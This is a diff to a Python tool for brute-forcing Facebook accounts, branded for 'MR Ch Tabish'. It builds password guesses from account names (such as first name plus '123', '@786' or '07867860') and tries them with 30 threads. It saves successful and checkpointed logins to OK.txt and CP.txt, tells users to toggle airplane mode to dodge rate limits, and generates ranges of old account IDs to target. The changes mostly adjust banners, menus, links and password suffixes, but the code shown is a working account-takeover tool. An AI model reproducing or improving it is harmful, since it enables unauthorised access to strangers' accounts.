@@ -196,7 +196,7 @@ def setting():
 		print (' [!] Choice Correct Option')
 		exit()
 	clear()
-	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2 \033[1;97m')
+	print(logo);print ('\n [01] Method Normal ');print (' [02] Method High \033[1;97m');print (' [03] Method Free Fire \033[1;97m');print (' [04] Method PUBG Lovers \033[1;32m');print (' [05] Danger ☠️  ⚡ \033[1;32m')
 	hc = input ("\n [#] method : ")
 	if hc in ['1','01']:
 		method.append('mobile')
@@ -220,7 +220,7 @@ def passmenu():
 		
 def first():
 	clear()
-	print(logo);print( '\n\033[1;94m [!] BRUTE  HAS BEEN START \n\033[1;96m [!] Turn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n')
+	print(logo);print( '\n\033[1;94m [!] BRUTE  HAS BEEN START \n\033[1;96m [!] Turn Airplane Mode On/Off Every 3 Minutes\033[1;0m\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -238,7 +238,7 @@ def first():
 				else:
 					pwv.append(nmf)
 					pwv.append(frs+'123')
-					pwv.append(frs+'12345')
+					pwv.append(frs+'07867860')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'free' in method:
@@ -247,7 +247,7 @@ def first():
 				pool.submit(crack,idf,pwv)
 def name():
 	clear()
-	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
+	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 2 Minutes\033[1;0m\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			try:
@@ -267,7 +267,7 @@ def name():
 				pass
 def name2():
 	clear()
-	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
+	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane ✈️ Mode On/Off Every  Minutes\033[1;0m\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -277,16 +277,16 @@ def name2():
 				if len(frs)<3:
 					pass
 				else:
-					pwv.append(frs+'123')
-					pwv.append(frs+'12345')
+					pwv.append(frs+'@123')
+					pwv.append(frs+'07867860')
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
 				else:
 					pwv.append(nmf)
 					pwv.append(frs+'123')
-					pwv.append(frs+'12345')
-					pwv.append(frs+'1234')
+					pwv.append(frs+'1122')
+					pwv.append(frs+'@786')
 					pwv.append(frs+'786')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
@@ -300,7 +300,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[Count] %s/%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[starting] %s/%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -339,7 +339,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ Count] %s/%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[starting] %s/%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -381,35 +381,36 @@ def follow(ses,coki):
 logo = """\033[1;30m
                   ▉▉▉▉
                  ▂▉▉▉▉▂
-                \033[1;33m╰▏ ┛┗ ▕╯
+                \033[1;33m╰▏°┛┗°▕╯
                  ╲ 👅 ╱
                  \033[1;32m╱▔╲╱▔╲
-               ╱ ╱▏╭╮▕╲ ╲.        
-               ╲ ╲▏╭╮▕╱ ╱       \033[1;31m  _
-                \033[1;35m ╲▉▉▉▉╱         \033[1;31m / `/_/
-                \033[1;34m  ▏╭╮▕          \033[1;31m/_,/ /
+               ╱ ╱▏╭╮▕╲ ╲         \033[1;37m___  _   _ 
+               ╲ ╲▏╭╮▕╱ ╱       \033[1;32m / __)( )_( )
+                \033[1;35m ╲▉▉▉▉╱         \033[1;38m( (__  ) _ ( 
+                \033[1;34m  ▏╭╮▕          \033[1;40m \___)(_) (_)™️
                 \033[1;34m  ▏▏▕▕
                   ▏▏▕▕
                 \033[1;31m ╭╰ ╮╭╰ ╮
-               \033[1;39msᴜʙ \033[1;35mᴋᴀ \033[1;36mʙᴀᴀᴘ
+               \033[1;39msᴜʙ \033[1;35mᴋᴀ \033[1;36mJigar
 \033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
-\033[0;92m
-\033[0;32m.------..------..------..------..------..------.
-\033[0;33m|T.--. ||A.--. ||B.--. ||I.--. ||S.--. ||H.--. |
-\033[0;34m| :/\: || (\/) || :(): || (\/) || :/\: || :/\: |
-\033[0;35m| (__) || :\/: || ()() || :\/: || :\/: || (__) |
-\033[0;36m| '--'T|| '--'A|| '--'B|| '--'I|| '--'S|| '--'H|
-\033[0;37m`------'`------'`------'`------'`------'`------'
+\033[0;33m                         𓂀 𝟘𝟛𝟙𝟝𝟞𝟜𝟙𝟡𝟡𝟝𝟚 𓂀
+\033[0;32m8888888b.  888     888 888888b.    .d8888b.  
+\033[0;33m888   Y88b 888     888 888  "88b  d88P  Y88b 
+\033[0;34m888    888 888     888 888  .88P  888    888 
+\033[0;35m888   d88P 888     888 8888888K.  888        
+\033[0;36m8888888P"  888     888 888  "Y88b 888  88888 
+\033[0;37m888        888     888 888    888 888    888 
+\033[0;33m888        Y88b. .d88P 888   d88P Y88b  d88P 
+\033[0;39m888         "Y88888P"  8888888P"   "Y8888P88 Tabish©️
 \033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
-\033[1;39m━▷ \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m◈✙◈\033[1;33m MR Ch Tabish
-\033[1;39m━▷ \033[0;91m𝙏𝙀𝘼𝙈     \033[1;39m◈✙◈\033[1;31m TEAM OF CHAUDHARY 
-\033[1;39m━▷ \033[0;91m𝙔𝙊𝙐𝙏𝙐𝘽𝙀  \033[1;39m◈✙◈ \033[1;32mCh Tabish TRICKER
-\033[1;39m━▷ \033[0;91m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;39m◈✙◈ \033[1;33mBAAP.HUN.TERA.MERY.BACHY
-\033[1;39m━▷ \033[0;91m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋 \033[1;39m◈✙◈ \033[1;34mFACEBOOK ZONE 🙂🙈
-\033[1;39m━▷ \033[0;91m𝙒𝙋 𝙂𝙍𝙊𝙐𝙋 \033[1;39m◈✙◈ \033[1;35mSTARTING EXIT SELECT AND JOIN
-\033[1;39m━▷ \033[0;91m𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;39m◈✙◈ \033[0;92mFREE AND ENJOY
-\033[1;39m━▷ \033[0;91m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m◈✙◈ \033[1;31m2.1
-\033[1;39m━▷ \033[1;36m𝙁𝙀𝙀𝙇 𝙏𝙃𝙀 𝙋𝙊𝙒𝙀𝙍 𝙊𝙁 Tabish 𝙊𝙒𝙉𝙀𝙍 𝙊𝙁 CH
+\033[1;39m━▷ \033[0;92m𝙊𝙒𝙉𝙀𝙍    \033[1;39m◈✙◈\033[1;33m MR Ch Tabish
+\033[1;39m━▷ \033[0;92m𝙏𝙀𝘼𝙈     \033[1;39m◈✙◈\033[1;33m TEAM OF CHAUDHARY 
+\033[1;39m━▷ \033[0;92m𝙔𝙊𝙐𝙏𝙐𝘽𝙀  \033[1;39m◈✙◈ \033[1;33mCHAUDHARY-TABISH 
+\033[1;39m━▷ \033[0;92m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋 \033[1;39m◈✙◈ \033[1;33mFACEBOOK ZONE 🙂🙈
+\033[1;39m━▷ \033[0;92m𝙒𝙋 𝙂𝙍𝙊𝙐𝙋 \033[1;39m◈✙◈ \033[1;33mSTARTING EXIT SELECT AND JOIN
+\033[1;39m━▷ \033[0;92m𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;39m◈✙◈ \033[0;33mFREE AND ENJOY
+\033[1;39m━▷ \033[0;92m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m◈✙◈ \033[1;91mA.110
+\033[1;39m━▷ \033[1;38m𝙁𝙀𝙀𝙇 𝙏𝙃𝙀 𝙋𝙊𝙒𝙀𝙍 𝙊𝙁 Tabish 𝙊𝙒𝙉𝙀𝙍 𝙊𝙁 CH
 \033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●"""
  
 class Main:
@@ -417,6 +418,7 @@ class Main:
 		self.id = []
 		self.ok = []
 		self.cp = []
+		self.cokie= []
 		self.loop = 0
 		os.system("clear")
 		print(logo)
@@ -425,10 +427,10 @@ class Main:
 		print("\033[1;37m     FIRST OF ALL SUBSCRIBE MY CHANNEL")
 		print("\033[1;33m     ●▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[1;33m●▬▬▬▬▬▬▬▬▬▬▬▬●")
 		
-		print(" \033[1;39m━▷\033[1;32m [1] SUBSCRIBE THE CHANNEL FOR APPROVED")
-		print(" \033[1;39m━▷\033[1;31m [2] Exit")
+		print(" \033[1;39m━▷\033[1;32m [1] Facebook hacking ")
+		print(" \033[1;39m━▷\033[1;31m [0] Exit")
 		print("")
-		baloch = input("\n\033[1;37m  \033[1;35mChoice \033[1;37m━━> \033[1;32m")
+		baloch = input("\n\033[1;37m  \033[1;34mChoice \033[1;37m━━> \033[1;32m")
 		if baloch in ["", " "]:
 			exit()
 		elif baloch in ["2", "02"]:
@@ -439,29 +441,20 @@ class Main:
 			os.system("xdg-open https://youtube.com/@tabish3301?si=DC15SoZJVkQffnfd")
 			print("")
 			time.sleep(2.0)
-			print("\033[1;37m    Type Your Channel Name")
-			print("")
-			input("\n\033[1;32m  Type Name \033[1;34m━━>  \033[1;33m")
-			time.sleep(2.1)
-			print("")
-			print("\033[1;37m Successful ")
-			time.sleep(2.0)
-			os.system("clear")
 		print(logo)
 		print(" \033[1;37m[▪]Select Option")
 		print("\033[0;90m \033[1;33m●▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[1;33m●▬▬▬▬▬▬▬▬▬▬▬●")
-		print(" \033[1;39m━▷ \033[1;31m【1】 \033[1;36mBest Crack File Cloning\033[0;92m   ✓ (Best)")
-		print(" \033[1;39m━▷ \033[1;32m【2】 \033[1;34mCrack Public Id's")
-		print(" \033[1;39m━▷ \033[1;33m【3】 \033[1;33mFacebook Group help ")
-		print(" \033[1;39m━▷ \033[1;34m【4】 \033[1;32mOld Cloning Id's 2006-10 \033[0;92m ✓ (Best)")
-		print(" \033[1;39m━▷ \033[1;35m【5】 \033[1;37mOld Cloning Id's 2011-16\033[0;92m  ✓ (Best) ")
+		print(" \033[1;39m━▷ \033[1;33m【1】 \033[1;92mBest Crack File Cloning\033[0;92m   ✓ (Best)")	
+		print(" \033[1;39m━▷ \033[1;33m【2】 \033[1;92mOld Cloning Id's 2006-10 \033[0;92m ✓ (Best)")
+		print(" \033[1;39m━▷ \033[1;33m【3】 \033[1;92mOld Cloning Id's 2011-16\033[0;92m  ✓ (Best) ")
+		print(" \033[1;39m━▷ \033[1;33m【4】 \033[1;93mFacebook Unlimited ")
 		print(" \033[1;39m━▷ \033[0;91m【E】 Exit \n")
-		MAINUL =input(" \033[1;35mChoice : ")
+		MAINUL =input(" \033[1;38mChoice : ")
 		if MAINUL in ["1", "01"]:
 			os.system("xdg-open youtube.com/@tabish3301?si=5oqBfnIIZxucVYwH")
 			File()
 		if MAINUL in ["2", "02"]:
-			os.system("xdg-open https://youtube.com/@tabish3301?si=5oqBfnIIZxucVYwH")
+			os.system("xdg-open https://chat.whatsapp.com/JKxaAH8ehBi3o35hYyfWYP")
 			Public()
 		if MAINUL in ["4", "04"]:
 			os.system("xdg-open https://youtube.com/@tabish3301?si=5oqBfnIIZxucVYwH")
@@ -474,11 +467,10 @@ class Main:
 			print (" Select Correctly ")
 			time.sleep(1)
 			Main()
- 
 	def old(self):
 		x = 111111111
 		xx = 999999999
-		idx = "100000" 
+		idx = "200000" 
 		os.system("xdg-open https://youtube.com/@tabish3301?si=5oqBfnIIZxucVYwH");print(logo)
 		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50000: "))
 		try:
